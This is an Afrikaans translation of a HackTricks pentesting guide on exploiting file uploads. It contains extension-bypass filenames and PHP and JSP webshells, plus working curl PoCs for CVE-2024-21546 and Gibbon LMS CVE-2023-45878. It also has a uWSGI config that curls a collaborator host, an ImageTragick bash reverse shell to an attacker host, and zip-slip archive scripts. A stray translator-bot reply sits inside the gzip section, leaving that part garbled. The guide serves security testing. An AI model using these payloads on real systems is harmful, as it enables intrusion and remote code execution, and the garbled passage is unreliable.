# Lêeroplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêeroplaai

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omseil lêeruitbreidingskontroles

1. As dit van toepassing is, **kontroleer** die **vorige extensies.** Toets hulle ook met sommige **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Kontroleer **om 'n geldige uitbreiding voor** die uitvoeringsuitbreiding by te voeg (gebruik ook vorige extensies):_
- _file.png.php_
- _file.png.Php5_
3. Probeer om **spesiale karakters aan die einde** by te voeg. Jy kan Burp gebruik om alle ascii en Unicode karakters te bruteforce. (_Let wel dat jy ook die **eersgenoemde** **extensies** kan probeer gebruik_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer om die beskerming te omseil deur die uitbreidingsparser te mislei met tegnieke soos **verdubbeling** van die **uitbreiding** of deur **rommeldata** (**null bytes**) tussen extensies by te voeg. _Jy kan ook die **vorige extensies** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg **nog 'n laag van extensies** by die vorige kontrole:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer om die **uitvoeringsuitbreiding voor die geldige uitbreiding** te sit en hoop dat die bediener verkeerd gekonfigureer is. (nuttig om Apache misconfigurasies te misbruik waar enigiets met die uitbreiding **_ .php _**, maar nie noodwendig eindigend in .php nie, code sal uitvoer):
- _ex: file.php.png_
7. Gebruik van **NTFS alternate data stream (ADS)** in **Windows**. In hierdie geval sal 'n kolon karakter ":" ingevoeg word na 'n verbode uitbreiding en voor 'n toegelate een. Gevolglik sal 'n **leë lêer met die verbode uitbreiding** op die bediener geskep word (bv. "file.asax:.jpg"). Hierdie lêer kan later met ander tegnieke gewysig word, soos deur sy short filename te gebruik. Die "**::$data**” patroon kan ook gebruik word om nie-leë lêers te skep. Dus kan dit nuttig wees om 'n puntkarakter na hierdie patroon by te voeg om verdere beperkings te omseil (bv. "file.asp::$data.").
8. Probeer om die lêernaamgrense te breek. Die geldige uitbreiding word afgesny. En die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoorde pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigering:
- Opgradeer unisharp/laravel-filemanager na ≥ 2.9.1.
- Afdwing streng server-side toegestaanlyste en hervalideer die gepersisteerde lêernaam.
- Bedien uploads vanaf nie-uitvoerbare liggings.

### Omseil Content-Type, Magic Number, Kompressie & Hergrootmaak

- Omseil **Content-Type** kontroles deur die **waarde** van die **Content-Type** **header** te stel op: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **woordlys**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Omseil die **magic number** kontrole deur aan die begin van die lêer die **bytes van 'n werklike beeld** by te voeg (verwar die _file_ opdrag). Of plaas die shell in die **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan ook die **payload direk in 'n beeld inbring**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- As **kompressie** op jou beeld toegepas word, byvoorbeeld met standaard PHP-biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie nuttig wees nie. Gebruik egter die **PLTE chunk** [**tegniek hier beskryf**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) om teks in te voeg wat **kompressie oorleef**.
- [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die webblad kan ook die **beeld hergroot**, byvoorbeeld met die PHP-GD funksies `imagecopyresized` of `imagecopyresampled`. Gebruik egter die **IDAT chunk** [**tegniek hier beskryf**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) om teks in te voeg wat **kompressie oorleef**.
- [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Nog 'n tegniek om 'n payload te maak wat **'n beeldhergrootte oorleef**, gebruik die PHP-GD funksie `thumbnailImage`. Gebruik egter die **tEXt chunk** [**tegniek hier beskryf**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) om teks in te voeg wat **kompressie oorleef**.
- [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ander trieke om te kontroleer

- Vind 'n kwesbaarheid om die reeds opgelaaide lêer te **herbenoem** (om die uitbreiding te verander).
- Vind 'n **Local File Inclusion** kwesbaarheid om die backdoor uit te voer.
- **Moontlike inligtingslek**:
1. Laai die **selfde lêer** **vele kere** op (en terselfdertyd) met dieselfde naam.
2. Laai 'n lêer op met die **naam** van 'n **lêer** of **gids** wat **alreeds bestaan**.
3. Laai 'n lêer op met **"." , "..", or "…" as its name**. Byvoorbeeld, in Apache op **Windows**, as die toepassing die opgelaaide lêers stoor in die "/www/uploads/" gids, sal die "." lêernaam 'n lêer met die naam uploads in die "/www/" gids skep.
4. Laai 'n lêer op wat nie maklik verwyder kan word nie, soos **"…:.jpg"** in **NTFS**. (Windows)
5. Laai 'n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in die naam. (Windows)
6. Laai 'n lêer op in **Windows** met **gereserveerde** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9.
- Probeer ook om 'n **uitvoerbare lêer** (.exe) of 'n **.html** (minder verdag) op te laai wat **kode sal uitvoer** wanneer dit per ongeluk deur die slagoffer geopen word.

### Spesiale uitbreidingstruuks

As jy probeer om lêers op te laai na 'n **PHP server**, [kyk na die **.htaccess** truuk om kode uit te voer](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
As jy probeer om lêers op te laai na 'n **ASP server**, [kyk na die **.config** truuk om kode uit te voer](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lêers is soos die `.jar` vir Java, maar vir PHP, en kan **soos 'n php-lêer gebruik word** (uitvoer met php, of insluit in 'n skrip...).

Die `.inc` uitbreiding word soms gebruik vir PHP-lêers wat slegs gebruik word om **lêers te importeer**, so op 'n tyd kon iemand hierdie uitbreiding toelaat om **uitgevoer te word**.

## **Jetty RCE**

As jy 'n XML-lêer na 'n Jetty-server kan oplaai, kan jy [RCE kry omdat **nuwe *.xml en *.war outomaties verwerk word**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos in die volgende beeld genoem, laai die XML-lêer op na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Vir 'n gedetailleerde ontleding van hierdie kwesbaarheid, sien die oorspronklike navorsing: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan in uWSGI-bedieners uitgebuit word as iemand die vermoë het om die `.ini` konfigurasielêer te wysig. uWSGI-konfigurasielêers gebruik 'n spesifieke sintaksis om "magiese" veranderlikes, plekhouers en operatore in te sluit. Spesifiek kan die '@' operator, gebruik as `@(filename)`, die inhoud van 'n lêer insluit. Van die verskeie ondersteunde skemas in uWSGI is die "exec" skema besonder kragtig, aangesien dit die lees van data vanaf 'n proses se standaarduitset toelaat. Hierdie funksie kan gemanipuleer word vir kwaadwillige doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer 'n `.ini` konfigurasielêer verwerk word.

Oorweeg die volgende voorbeeld van 'n skadelike `uwsgi.ini` lêer, wat verskeie skemas demonstreer:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload gebeur tydens die ontleding van die konfigurasielêer. Vir die konfiguratie om geaktiveer en ontleed te word, moet die uWSGI-proses óf herbegin word (moontlik na 'n crash of as gevolg van 'n Denial of Service attack) óf die lêer moet op auto-reload gestel wees. Die auto-reload feature, as dit geaktiveer is, laai die lêer op gespesifiseerde intervalle opnieuw wanneer veranderinge opgespoor word.

Dit is noodsaaklik om die los aard van uWSGI se konfigurasielêer-ontleding te verstaan. Spesifiek kan die bespreekte payload in 'n binaêre lêer (soos 'n image of PDF) ingevoeg word, wat die omvang van moontlike eksploitasie verder uitbrei.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimale PoC om 'n lêer te skryf en terug te lees:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Laai 'n minimale webshell op en voer opdragte uit:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Aantekeninge:
- Die handler voer `base64_decode($_POST["img"])` uit nadat dit deur `;` en `,` gesplit is, en skryf dan bytes na `$absolutePath . '/' . $_POST['path']` sonder om die extensie/tipe te valideer.
- Die resulterende kode word uitgevoer as die webdiensgebruiker (bv., XAMPP Apache op Windows).

Verwysings vir hierdie fout sluit die usd HeroLab advisory en die NVD entry in. Sien die References-afdeling hieronder.

## **wget File Upload/SSRF Trick**

In sommige gevalle mag jy vind dat 'n bediener **`wget`** gebruik om **lêers af te laai** en jy kan die **URL** aandui. In sulke gevalle kan die kode dalk kontroleer dat die extensie van die afgelaaide lêers binne 'n whitelist is om te verseker dat slegs toegelate lêers afgelaai sal word. Nietemin, **hierdie kontrole kan omseil word.**\
Die **maximum** lengte van 'n **lêernaam** in **linux** is **255**, maar **wget** verkort die lêernaam na **236** karakters. Jy kan **download a file called "A"*232+".php"+".gif"**, hierdie lêernaam sal die **kontrole** omseil (soos in hierdie voorbeeld **".gif"** 'n **geldige** extensie is) maar `wget` sal die lêer **hernoem** na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Let daarop dat **'n ander opsie** waaraan jy dalk dink om hierdie kontrole te omseil, is om die **HTTP server te laat herlei na 'n ander lêer**, sodat die aanvanklike URL die kontrole sal omseil en wget dan die herlei lêer met die nuwe naam sal aflaai. Dit **gaan nie werk nie** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die herlei bladsy met die naam van die lêer soos in die oorspronklike URL aangedui sal aflaai**.

### Ontsnap uit die upload directory via NTFS junctions (Windows)

(Vir hierdie aanval sal jy plaaslike toegang tot die Windows-masjien nodig hê) Wanneer uploads onder per-user subfolders op Windows gestoor word (e.g., C:\Windows\Tasks\Uploads\<id>\) en jy beheer die skep/verwydering van daardie subfolder, kan jy dit vervang met 'n directory junction wat na 'n sensitiewe ligging wys (e.g., die webroot). Daarna sal daaropvolgende uploads in die teikenpad geskryf word, wat code execution moontlik maak as die teiken server-side code interpreteer.

Voorbeeldvloei om uploads na die XAMPP webroot te herlei:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Aantekeninge
- mklink /J creates an NTFS directory junction (reparse point). Die webbediener se rekening moet die junction volg en skryfpermisie in die bestemming hê.
- Dit herlei willekeurige lêerinskrywings; as die bestemming skripte (PHP/ASP) uitvoer, word dit RCE.
- Defenses: moenie toelaat dat skryfbare upload-roots deur 'n aanvaller beheerbaar is onder C:\Windows\Tasks of soortgelyk nie; blokkeer junction creation; valideer extensies server-side; stoor uploads op 'n aparte volume of met deny-execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).

Generiese uitbuitingvloei:
- Berei jou server-side payload voor (bv. minimale JSP webshell) en gzip-comprimeer die bytes.
- Stuur 'n POST waarin 'n path parameter (bv. token) traversering bevat wat die bedoelde gids ontvlug, en file die lêernaam aandui om te persisteer. Stel Content-Type: application/octet-stream en Content-Encoding: gzip; die body is die gekompresste payload.
- Blaai na die geskryfde lêer om uitvoering te aktiveer.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Ek het nie die lêerinhoud ontvang nie. Plak asseblief die inhoud van src/pentesting-web/file-upload/README.md wat jy wil hê ek moet vertaal.
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Aantekeninge
- Teikenpade wissel per installasie (bv., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in sommige stacks). Enige web-blootgestelde vouer wat JSP uitvoer sal werk.
- Burp Suite’s Hackvertor extension kan 'n korrekte gzip-body van jou payload produseer.
- Dit is 'n suiwer pre-auth arbitrary file write → RCE pattern; dit is nie afhanklik van multipart parsing nie.

Mitigerings
- Bepaal upload-bestemmings aan die bedienerkant; vertrou nooit padfragmente van kliënte nie.
- Kanonaliseer en dwing af dat die opgeloste pad binne 'n toegelate basisgids bly.
- Berg uploads op 'n nie-uitvoerende volume en weier skriptaanvoer/uitvoering vanaf skryfbare paaie.

## Gereedskap

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige hulpmiddel wat ontwerp is om Pentesters and Bug Hunters te help om file upload mechanisms te toets. Dit benut verskeie bug bounty-tegnieke om die proses van die identifisering en benutting van kwesbaarhede te vereenvoudig, en verseker deeglike assesserings van webtoepassings.

### Korrupteer upload-indekse met snprintf-eienaardighede (histories)

Sommige legacy upload handlers wat `snprintf()` of soortgelyke funksies gebruik om multi-file arrays uit 'n enkel-lêer upload te bou, kan mislei word om die `_FILES` struktuur te vervals. As gevolg van inkonsekwenthede en afkapting in `snprintf()` gedrag, kan 'n sorgvuldig saamgestelde enkele upload aan die bediener-kant as veelvuldige geïndekseerde lêers voorkom, wat logika verwar wat 'n streng vorm aanvaar (bv., dit as 'n multi-file upload beskou en onveilige takke volg). Alhoewel dit vandag nismatig is, herleef hierdie “index corruption” patroon af en toe in CTFs en ouer codebasisse.

## From File upload to other vulnerabilities

- Stel **filename** op `../../../tmp/lol.png` en probeer om 'n **path traversal** te bewerkstellig
- Stel **filename** op `sleep(10)-- -.jpg` en jy mag 'n **SQL injection** kan bereik
- Stel **filename** op `<svg onload=alert(document.domain)>` om 'n XSS te bereik
- Stel **filename** op `; sleep 10;` om sekere command injection te toets (meer [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probeer **different svg payloads** vanaf [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- As jy die webbediener kan aandui om 'n beeld vanaf 'n URL te haal, kan jy probeer om 'n [SSRF](../ssrf-server-side-request-forgery/index.html) te misbruik. As hierdie **image** gestoor gaan word op 'n **public** site, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en **inligting van elke besoeker steel**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Spesiaal saamgestelde PDFs vir XSS: Die [volgende bladsy verduidelik hoe om **PDF-data in te spuit om JS-uitvoering te verkry**](../xss-cross-site-scripting/pdf-injection.md). As jy PDFs kan upload, kan jy 'n PDF voorberei wat arbitraire JS sal uitvoer volgens die gegewe aanwysings.
- Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud op om te kyk of die bediener enige **antivirus** het
- Kontroleer of daar enige **size limit** is wanneer lêers opgelaaI word

Hier 'n top 10 lys van dinge wat jy deur oplaai kan bereik (van [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiese Header-bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Raadpleeg [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) vir ander lêertipes.

## Zip/Tar-lêer wat outomaties by die bediener gedekomprimeer word

As jy 'n ZIP kan upload wat binne die bediener gedekomprimeer gaan word, kan jy twee dinge doen:

### Symlink

Laai 'n argief op wat simboliese skakels na ander lêers bevat; wanneer jy die gedekomprimeerde lêers benader, sal jy toegang kry tot die gekoppelde lêers:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Ontpak in verskillende gidse

Die onverwagte skepping van lêers in gidse tydens ontpakking is 'n beduidende probleem. Ondanks aanvanklike aannames dat hierdie opstelling moontlik sou beskerm teen OS-vlak opdraguitvoering deur kwaadwillige lêeroplaaie, kan die hiërargiese kompressie-ondersteuning en directory traversal capabilities van die ZIP archive format misbruik word. Dit stel aanvalers in staat om beperkings te omseil en uit veilige oplaai-gidse te ontsnap deur die ontpakfunksionaliteit van die geteikende toepassing te manipuleer.

An geoutomatiseerde eksploit om sulke lêers te skep is beskikbaar by [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die utility kan soos volg gebruik word:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Verder is die **symlink trick with evilarc** 'n opsie. As die doelwit is om 'n lêer soos `/flag.txt` te teiken, moet 'n symlink na daardie lêer in jou stelsel geskep word. Dit verseker dat evilarc nie foute tydens sy werking sal ondervind nie.

Hieronder is 'n voorbeeld van Python code wat gebruik word om 'n kwaadwillige zip file te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir file spraying**

Vir meer besonderhede **kyk na die oorspronklike pos by**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-kode is geskryf om opdragte uit te voer wat via die `$_REQUEST`-veranderlike deurgegee word.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Meerdere lêers word geskep en 'n zip-argief saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die name van die lêers binne die zip word met vi of 'n hex editor gewysig, deur "xxA" na "../" te verander om gidsies te traverseer.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Laai hierdie inhoud op met 'n beeld-uitbreiding om die kwesbaarheid uit te buit **(ImageMagick , 7.0.1-1)** (van die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insluiting van PHP Shell in PNG

Die inbeding van 'n PHP shell in die IDAT chunk van 'n PNG-lêer kan sekere beeldverwerkingstake effektief omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is besonder relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir die verander van grootte en hersamplering van beelde, onderskeidelik. Die vermoë van die ingeslote PHP shell om deur hierdie operasies onaangeraak te bly, is 'n beduidende voordeel vir sekere gebruiksgevalle.

'n Gedetailleerde ondersoek van hierdie tegniek, insluitend die metodologie en moontlike toepassings, word in die volgende artikel verskaf: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en die implikasies daarvan.

Meer inligting in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-lêers

